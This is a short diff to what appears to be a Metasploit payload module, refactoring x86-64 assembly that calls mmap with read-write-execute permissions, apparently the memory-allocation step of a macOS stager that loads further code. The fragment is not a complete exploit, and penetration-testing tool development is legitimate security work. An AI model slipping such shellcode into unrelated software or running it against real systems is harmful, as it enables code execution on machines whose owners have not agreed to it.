@@ -36,18 +36,15 @@ module MetasploitModule
     ; mmap(0x0, 0x1000, 0x7, 0x1002, 0x0, 0x0)
     push 0
     pop rdi
-    push 0x1000
-    pop rsi
+    mov rsi, 0x1000
     push 7
     pop rdx
-    push 0x1002
-    pop r10
+    mov r10, 0x1002
     push 0
     pop r8
     push 0
     pop r9
-    push 0x20000c5
-    pop rax
+    mov rax, 0x20000c5
     syscall
     jb failed
 
